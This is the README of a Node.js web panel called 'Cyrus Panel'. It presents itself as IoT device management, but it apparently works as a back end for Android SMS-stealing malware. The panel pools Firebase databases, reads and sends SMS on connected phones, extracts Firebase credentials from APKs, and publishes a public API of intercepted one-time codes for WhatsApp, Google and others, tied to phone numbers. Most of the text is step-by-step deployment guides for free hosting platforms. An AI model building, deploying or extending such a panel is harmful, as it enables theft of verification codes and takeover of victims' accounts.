# CYRUS PANEL

Full-featured IoT device management panel with admin control, unified Firebase connections, OTP API, and user management. Built with **Node.js + Express**.

```
ADMIN (/admin/)                    USERS (/dashboard/)
• Add Firebase URLs + keys         • All devices from all databases
• Manage users (enable/disable)    • Live OTP feed
• System stats                     • Device controls + SMS
        │                                  │
        └──── Firebase Pool (unified) ─────┘
                     │
              /api/otp (public API)
```

---

## Features

| Feature | Description |
|---------|-------------|
| 🔐 Auth | Register, login, JWT sessions, bcrypt passwords |
| 👑 Admin Panel | Firebase CRUD, user management, stats |
| 🔗 Firebase Pool | Add multiple DBs, all unified for users |
| 📡 OTP API | `/api/otp?count=10` — same format as numberpanel.tech |
| 👤 Profiles | API key, password change, edit info |
| 📦 APK Parser | Extract Firebase creds from Android APKs |
| 📱 Devices | List, SMS, delete, message reading |
| 🔒 Security | Helmet, rate limiting, input validation |

---

## Quick Start (Local)

```bash
git clone https://github.com/Code-Stride/indianpanel.git
cd indianpanel
npm install          # auto-runs build
# Edit .env if needed (see .env.example)
npm start
# Open http://localhost:3000
```

**First user to register = admin.** Or set `ADMIN_USERNAME` + `ADMIN_PASSWORD` in `.env`.

---

## 🚀 Deployment Guides

### Deploy to Any Platform

Pick your platform below. All options work out of the box — the `postinstall` script auto-builds the frontend.

| Platform | Cost | CC Needed | Persistent Data | Difficulty |
|----------|------|-----------|-----------------|------------|
| [Glitch](#glitch-free) | Free | ❌ | ✅ | ⭐ 2 min |
| [Render](#render-free) | Free | ❌ | ⚠️ Resets on deploy | ⭐⭐ 5 min |
| [Railway](#railway-free-credit) | $5 free | ❌ | ✅ | ⭐⭐ 5 min |
| [Fly.io](#flyio-free-tier) | Free | ✅ | ✅ | ⭐⭐⭐ 10 min |
| [Koyeb](#koyeb-free) | Free | ❌ | ⚠️ | ⭐⭐ 5 min |
| [Replit](#replit-free) | Free | ❌ | ✅ | ⭐ 3 min |
| [Home + Cloudflare](#home--cloudflare-tunnel-free-forever) | Free | ❌ | ✅ | ⭐⭐ 15 min |
| [Docker](#docker-any-vps) | Varies | — | ✅ | ⭐⭐ |
| [VPS (PM2)](#vps-with-pm2) | ~₹150+/mo | — | ✅ | ⭐⭐⭐ |
| [Heroku](#heroku) | $5+/mo | ✅ | ⚠️ | ⭐⭐ |
| [DigitalOcean App](#digitalocean-app-platform) | $5/mo | ✅ | ⚠️ | ⭐⭐ |

---

### Glitch (Free)

**Best for: Quick deploy, no credit card, persistent data.**

1. Go to [glitch.com](https://glitch.com) → Sign up with GitHub
2. Click **"New Project" → "Import from GitHub"**
3. Paste: `https://github.com/Code-Stride/indianpanel`
4. Open the `.env` file and add:
   ```env
   ADMIN_USERNAME=admin
   ADMIN_PASSWORD=your-password-here
   SESSION_SECRET=make-this-a-long-random-string
   ```
5. Glitch auto-installs and starts. Your panel is live at `project-name.glitch.me`

> ⚠️ Glitch free tier sleeps after 5 minutes of inactivity (wakes in ~5 seconds).

---

### Render (Free)

**Best for: Easy GitHub auto-deploy.**

1. Go to [render.com](https://render.com) → Sign up with GitHub
2. Click **"New +" → "Web Service"**
3. Connect your GitHub repo
4. Settings:
   - **Name**: `cyrus-panel`
   - **Runtime**: `Node`
   - **Build Command**: `npm install`
   - **Start Command**: `node server.js`
   - **Plan**: `Free`
5. Add **Environment Variables**:

   | Key | Value |
   |-----|-------|
   | `NODE_ENV` | `production` |
   | `ADMIN_USERNAME` | `admin` |
   | `ADMIN_PASSWORD` | `your-password` |
   | `SESSION_SECRET` | `random-long-string` |

6. Click **Create Web Service**

**One-click deploy:**

[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)

> ⚠️ Free tier spins down after 15 min inactivity. Data resets on each deploy (no persistent disk on free).

---

# Railway PostgreSQL Setup

After deploying on Railway:

1. Click **"+ New"** → **"Database"** → **"PostgreSQL"**
2. Click on the PostgreSQL service → **"Connect"** → copy **`DATABASE_URL`**
3. Go to your web service → **"Variables"** → add:
   - `DATABASE_URL` = (paste the connection string)
4. Railway will auto-redeploy → tables are created automatically

1. Go to [railway.app](https://railway.app) → Sign up with GitHub
2. Click **"New Project" → "Deploy from GitHub repo"**
3. Select your repo
4. Add variables in Railway dashboard:
   ```
   ADMIN_USERNAME=admin
   ADMIN_PASSWORD=your-password
   SESSION_SECRET=random-string
   ```
5. Railway auto-detects `package.json` and deploys
6. Add a **volume** mounted at `/app/data` for persistent storage (Settings → Volumes)

**One-click deploy:**

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template)

> $5 free credit/month. Persistent volumes available.

---

### Fly.io (Free Tier)

**Best for: Global edge deployment with persistent volume.**

```bash
# 1. Install flyctl
curl -L https://fly.io/install.sh | sh

# 2. Login
fly auth signup    # or: fly auth login

# 3. Launch (uses fly.toml in the repo)
fly launch

# 4. Set secrets
fly secrets set ADMIN_USERNAME=admin
fly secrets set ADMIN_PASSWORD=your-password
fly secrets set SESSION_SECRET=$(openssl rand -hex 32)

# 5. Create persistent volume
fly volumes create cyrus_data --region sin --size 1

# 6. Deploy
fly deploy
```

The `fly.toml` in this repo is pre-configured with a volume mount at `/app/data`.

---

### Koyeb (Free)

**Best for: European hosting, simple deploy.**

1. Go to [koyeb.com](https://koyeb.com) → Sign up with GitHub
2. Click **"Create App" → "GitHub"**
3. Select your repo
4. Configure:
   - **Build**: `npm install`
   - **Run**: `node server.js`
   - **Port**: `3000`
5. Add environment variables: `ADMIN_USERNAME`, `ADMIN_PASSWORD`, `SESSION_SECRET`
6. Deploy

**One-click:**

[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy)

---

### Replit (Free)

**Best for: Coding + hosting in browser.**

1. Go to [replit.com](https://replit.com) → Sign up
2. Click **"Create Repl" → "Import from GitHub"**
3. Paste: `https://github.com/Code-Stride/indianpanel`
4. Open the **🔒 Secrets** tab → add:
   ```
   ADMIN_USERNAME = admin
   ADMIN_PASSWORD = your-password
   SESSION_SECRET = random-long-string
   ```
5. Click **Run** → Panel is live at `project.yourname.repl.co`

> Persistent storage on free tier. Sleeps when inactive.

---

### Home + Cloudflare Tunnel (Free Forever)

**Best for: Zero cost, full control, persistent data.**

```bash
# 1. Clone and run
git clone https://github.com/Code-Stride/indianpanel.git
cd indianpanel
npm install
# Create .env with your settings
node server.js

# 2. In another terminal, install cloudflared
# Windows: https://github.com/cloudflare/cloudflared/releases
# Linux:
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
chmod +x cloudflared

# 3. Expose to the internet (gives you a free *.trycloudflare.com URL)
./cloudflared tunnel --url http://localhost:3000
```

**Want a custom domain?** Free Cloudflare account → named tunnel → point your domain.

**Keep it running 24/7:**
```bash
# Use PM2 to keep the server alive
npm install -g pm2
pm2 start server.js --name cyrus-panel
pm2 save && pm2 startup

# Run cloudflared as a service (Linux)
sudo cloudflared service install
```

---

### Docker (Any VPS)

**Best for: Consistent environments, easy scaling.**

```bash
# Clone
git clone https://github.com/Code-Stride/indianpanel.git
cd indianpanel

# Create .env
cp .env.example .env
# Edit .env with your settings

# Run with Docker Compose
docker compose up -d

# View logs
docker compose logs -f

# Stop
docker compose down
```

Or build and run manually:
```bash
docker build -t cyrus-panel .
docker run -d -p 3000:3000 -v $(pwd)/data:/app/data --env-file .env cyrus-panel
```

The `docker-compose.yml` mounts `./data` as a persistent volume.

---

### VPS with PM2

**Best for: Full control, cheapest long-term.**

**One-command setup:**
```bash
curl -sSL https://raw.githubusercontent.com/Code-Stride/indianpanel/main/setup.sh | bash
```

**Manual setup:**
```bash
# 1. Install Node.js 20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# 2. Clone & install
git clone https://github.com/Code-Stride/indianpanel.git
cd indianpanel
npm install

# 3. Configure
cp .env.example .env
nano .env    # Set ADMIN_USERNAME, ADMIN_PASSWORD, SESSION_SECRET

# 4. Run with PM2
npm install -g pm2
pm2 start ecosystem.config.js --env production
pm2 save
pm2 startup    # Auto-start on boot
```

**Add Nginx reverse proxy + SSL:**
```bash
sudo apt install nginx certbot python3-certbot-nginx

# Create /etc/nginx/sites-available/cyrus-panel
sudo tee /etc/nginx/sites-available/cyrus-panel << 'EOF'
server {
    listen 80;
    server_name panel.yourdomain.com;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/cyrus-panel /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
sudo certbot --nginx -d panel.yourdomain.com
```

---

### Heroku

```bash
# Install Heroku CLI, then:
heroku create cyrus-panel
heroku config:set ADMIN_USERNAME=admin ADMIN_PASSWORD=your-pass SESSION_SECRET=random
git push heroku main
```

> ⚠️ Heroku has ephemeral filesystem — data resets on each deploy. Free tier discontinued.

---

### DigitalOcean App Platform

1. Go to DigitalOcean → Apps → Create App
2. Connect GitHub repo
3. Settings auto-detected from `app.json`
4. Add environment variables
5. Deploy

> ⚠️ Needs persistent storage add-on for data retention.

---

## Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `PORT` | No | `3000` | Server port |
| `NODE_ENV` | No | `development` | `production` for deploy |
| `SESSION_SECRET` | **Yes** | random | JWT signing secret |
| `ADMIN_USERNAME` | No | — | Bootstrap admin username |
| `ADMIN_PASSWORD` | No | — | Bootstrap admin password |
| `ADMIN_EMAIL` | No | — | Bootstrap admin email |
| `TG_BOT_TOKEN` | No | — | Telegram bot token |
| `TG_CHAT_ID` | No | — | Telegram chat ID |
| `DATA_DIR` | No | `./data` | Path for JSON database files |
| `RATE_LIMIT_WINDOW_MS` | No | `900000` | Rate limit window |
| `RATE_LIMIT_MAX_REQUESTS` | No | `100` | Max requests per window |
| `MAX_UPLOAD_SIZE_MB` | No | `50` | Max APK upload size |

---

## API Reference

### OTP API (Public)

```bash
# Get latest 10 OTPs
curl https://your-panel.com/api/otp?count=10

# Get 50 OTPs, fresh (no cache)
curl https://your-panel.com/api/otp?count=50&fresh=1

# With API key (get from /profile/)
curl https://your-panel.com/api/otp?count=10&key=cp_your_key
```

**Response:**
```json
[
  ["WhatsApp", "919876543210", "Your code 123-456", "2026-08-13 13:00:00", " India"],
  ["Google", "14155551234", "G-654321 is your code", "2026-08-13 12:59:00", " USA"]
]
```

### Auth
```bash
# Register
curl -X POST /api/auth/register -H "Content-Type: application/json" \
  -d '{"username":"john","email":"john@test.com","password":"pass1234"}'

# Login
curl -X POST /api/auth/login -H "Content-Type: application/json" \
  -d '{"login":"john","password":"pass1234"}'
```

### Admin (requires admin JWT)
```bash
# Add Firebase connection
curl -X POST /api/admin/connections -H "Cookie: cyrus_token=TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Main DB","url":"https://app.firebaseio.com","key":"secret"}'

# List connections
curl /api/admin/connections -H "Cookie: cyrus_token=TOKEN"

# List users
curl /api/admin/users -H "Cookie: cyrus_token=TOKEN"

# Stats
curl /api/admin/stats -H "Cookie: cyrus_token=TOKEN"
```

---

## Project Structure

```
├── server.js                    # Express entry point
├── setup.sh                     # One-command VPS setup
├── Dockerfile                   # Docker build
├── docker-compose.yml           # Docker Compose
├── fly.toml                     # Fly.io config
├── render.yaml                  # Render blueprint
├── Procfile                     # Heroku/Railway
├── railway.json                 # Railway config
├── glitch.json                  # Glitch config
├── ecosystem.config.js          # PM2 config
├── app.json                     # DO App Platform
│
├── src/
│   ├── config/index.js          # Configuration
│   ├── database.js              # JSON file database
│   ├── middleware/               # Auth, rate limit, errors
│   ├── routes/                  # API routes
│   │   ├── admin.js             # 🔐 Admin panel API
│   │   ├── auth.js              # Login/register
│   │   ├── otp.js               # 📡 OTP API
│   │   ├── profile.js           # User profiles
│   │   ├── firebase.js          # Firebase proxy
│   │   ├── devices.js           # Device management
│   │   └── ...
│   └── services/                # Business logic
│       ├── auth.js              # JWT, bcrypt, admin bootstrap
│       ├── connections.js       # Global Firebase pool
│       ├── otpExtractor.js      # OTP detection (30+ services)
│       └── ...
│
├── admin/index.html             # 🔐 Admin panel UI
├── login/index.html             # Login page
├── register/index.html          # Registration
├── profile/index.html           # Profile page
├── connections/index.html       # Connections view
├── assets/app.css               # Shared styles
└── client-js/                   # Client-side modules
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Port already in use | Change `PORT` in `.env` |
| Data lost after restart | Mount a persistent volume at `/app/data` (or set `DATA_DIR`) |
| Login fails after deploy | Set `SESSION_SECRET` to a fixed value (JWTs are signed with it) |
| Can't add Firebase URL | Must be HTTPS and end with `.firebaseio.com` or `.firebasedatabase.app` |
| OTP API returns empty | Admin must add at least one active Firebase connection first |
| Glitch/Render sleeps | Normal for free tiers; wakes up on next request |

---

## License

UNLICENSED — Private use only.
